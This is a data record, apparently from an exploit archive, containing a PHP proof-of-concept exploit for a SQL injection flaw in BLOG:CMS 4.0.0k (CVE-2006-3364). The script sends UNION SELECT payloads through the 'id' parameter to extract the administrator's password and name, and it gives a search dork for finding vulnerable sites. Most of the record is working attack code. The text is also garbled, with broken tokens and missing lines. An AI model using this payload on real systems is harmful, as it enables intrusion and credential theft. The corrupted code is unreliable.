{
    "text": "vul_name : BLOG : CMS <= 4.0.0k sql injection ， vul_cve : CVE-2006-3364 ， vul_poc :  #  ! /usr/bin/php -q -d short_open_tag=on ， <? ， echo \"BLOG : CMS <= 4.0.0k sql injection/admin credentials disclosure exploitn\" ;  ， echo \"by rgod rgod ( at ) autistici ( dot ) org [ email concealed ] n\" ;  ， echo \"site :  ， echo \"dork : \"Powered by BLOG : CMS\" | \"Powered by blogcms.com\" | \"2003-2004 , Radek Huln\"nn\" ;  ， echo \"Usage : php \". $ argv [ 0 ] .\" host path OPTIONSn\" ;  ， echo \"host : target server ( ip/hostname ) n\" ;  ， echo \"path : path to BLOG : CMSn\" ;  ， echo \"Options : n\" ;  ， echo \" -p [ port ]  : specify a port other than 80n\" ;  ， echo \" -P [ ip : port ]  : specify a proxyn\" ;  ， echo \" -T [ prefix ]  : specify a table prefix ( default : none ) n\" ;  ， echo \"Example : n\" ;  ， echo \"php \". $ argv [ 0 ] .\" localhost /blog/n\" ;  ， die ;  ， } ， / * software site :  ， i ) vulnerable code in index.php , lines 19-36 :  ， . ， / NP_SEO plugin redirect ，  $ query=sql_query ( \"select url from \".sql_table ( \"plug_seo\" ) .\" where id='\".undoMagic (  $ _GET [ 'id' ]  ) .\"'\" )  ;  ，  $ row->url=stripslashes (  $ row->url )  ;  ，  $ redirect=true ;  ，  $ arr=explode ( \" , \" , 'msnbot , googlebot , crawler , centrum' )  ;  ， foreach (  $ arr as $ s ) if ( strstr (  $ _SERVER [ \"HTTP_USER_AGENT\" ]  ,  $ s )  $ redirect=false ;  ，  $ arr=explode ( \" , \" , 'downloader.seznam , inktomi , yahoo , altavista , fasttrack , ex ， cite , hotbot , alltheweb , yahoo' )  ;  ，  $ dns = strtolower (  @ gethostbyaddr (  $ _SERVER [ \"REMOTE_ADDR\" ]  )  ;  ， foreach (  $ arr as $ s ) if ( strstr (  $ dns ,  $ s )  $ redirect=false ;  ，  $ row->url=str_replace ( ' | noseo | ' , ' ,  $ row->url )  ;  ， } ， } ， unset (  $ query )  ;  ， } ， . ， \"id\" argument is not sanitized before to be used in a sql query. ， also you can inject sql statements regardless of magic_quotes_gpc settings ,  ， look at undoMagic (  ) function in vars4.1.0.php :  ， / removes magic quotes if that option is enabled ， } ， very nice code :  )  ， error_reporting ( 0 )  ;  ， ini_set ( \"max_execution_time\" , 0 )  ;  ， ini_set ( \"default_socket_timeout\" , 5 )  ;  ， { ，  $ result=' ;  $ exa=' ;  $ cont=0 ;  ， { ， { $ result.=\" .\" ; } ， { $ result.=\" \". $ string [  $ i ]  ; } ， { $ exa.=\" \".dechex ( ord (  $ string [  $ i ]  )  ; } ， { $ exa.=\" 0\".dechex ( ord (  $ string [  $ i ]  )  ; } ，  $ cont+ ; if (  $ cont=15 ) { $ cont=0 ;  $ result.=\"rn\" ;  $ exa.=\"rn\" ; } ， } ， } ，  $ proxy_regex = ' ( bd{1 , 3}.d{1 , 3}.d{1 , 3}.d{1 , 3} : d{1 , 5}b ) ' ;  ， { ， global $ proxy ,  $ host ,  $ port ,  $ html ,  $ proxy_regex ;  ，  $ ock=fsockopen ( gethostbyname (  $ host )  ,  $ port )  ;  ， echo 'No response from '. $ host.' : '. $ port ; die ;  ， } ， } ，  $ c = preg_match (  $ proxy_regex ,  $ proxy )  ;  ， echo 'Not a valid proxy.' ; die ;  ， } ，  $ parts=explode ( ' : ' ,  $ proxy )  ;  ， echo \"Connecting to \". $ parts [ 0 ] .\" : \". $ parts [ 1 ] .\" proxy.rn\" ;  ，  $ ock=fsockopen (  $ parts [ 0 ]  ,  $ parts [ 1 ]  )  ;  ， echo 'No response from proxy.' ; die ;  ， } ， } ， fputs (  $ ock ,  $ packet )  ;  ，  $ html=' ;  ，  $ html.=fgets (  $ ock )  ;  ， } ， } ，  $ html=' ;  ，  $ html.=fread (  $ ock , 1 )  ;  ， } ， } ， fclose (  $ ock )  ;  ，  # debug ，  # echo \"rn\". $ html ;  ， } ，  $ host= $ argv [ 1 ]  ;  ，  $ path= $ argv [ 2 ]  ;  ，  $ port=80 ;  ，  $ proxy=\" ;  ，  $ prefix=\" ;  ，  $ temp= $ argv [  $ i ]  [ 0 ] . $ argv [  $ i ]  [ 1 ]  ;  ， { ，  $ port=str_replace ( \"-p\" , \" ,  $ argv [  $ i ]  )  ;  ， } ， { ，  $ proxy=str_replace ( \"-P\" , \" ,  $ argv [  $ i ]  )  ;  ， } ， { ，  $ prefix=str_replace ( \"-T\" , \" ,  $ argv [  $ i ]  )  ;  ， } ， } ，  $ sql=\"9999999'/UNION/SELECT/mpassword/FROM/\". $ prefix.\"nuc ， leus_member/WHERE/mnumber=1/ * \" ; /id = 2 , admin ，  $ sql=urlencode (  $ sql )  ;  ，  $ packet =\"GET \". $ p.\"?id= $ sql HTTP/1.0rn\" ;  ，  $ packet.=\"Host : \". $ host.\"rn\" ;  ，  $ packet.=\"Connection : Closernrn\" ;  ， sendpacketii (  $ packet )  ;  ，  $ temp=explode ( \"Location : \" ,  $ html )  ;  ，  $ temp2=explode ( \"n\" ,  $ temp [ 1 ]  )  ;  ，  $ temp2 [ 0 ] =trim (  $ temp2 [ 0 ]  )  ;  ， { ， echo \"exploit succeded.n\" ;  ， echo \"password ( \". $ type.\" ) -> \". $ temp2 [ 0 ] .\"n\" ;  ，  $ sql=\"9999999'/UNION/SELECT/mrealname/FROM/\". $ prefix.\"nuc ， leus_member/WHERE mnumber=1/ * \" ;  ，  $ sql=urlencode (  $ sql )  ;  ，  $ packet =\"GET \". $ p.\"?id= $ sql HTTP/1.0rn\" ;  ，  $ packet.=\"Host : \". $ host.\"rn\" ;  ，  $ packet.=\"Connection : Closernrn\" ;  ， sendpacketii (  $ packet )  ;  ，  $ temp=explode ( \"Location : \" ,  $ html )  ;  ，  $ temp2=explode ( \"n\" ,  $ temp [ 1 ]  )  ;  ， echo \"admin -> \". $ temp2 [ 0 ] .\"n\" ;  ， } ， { ， /debug ， echo $ html.\"rn\" ;  ， echo \"exploit failed. see htmln\" ;  ， } ， ?> ， original url : ",
    "time": "2006.07.11"
}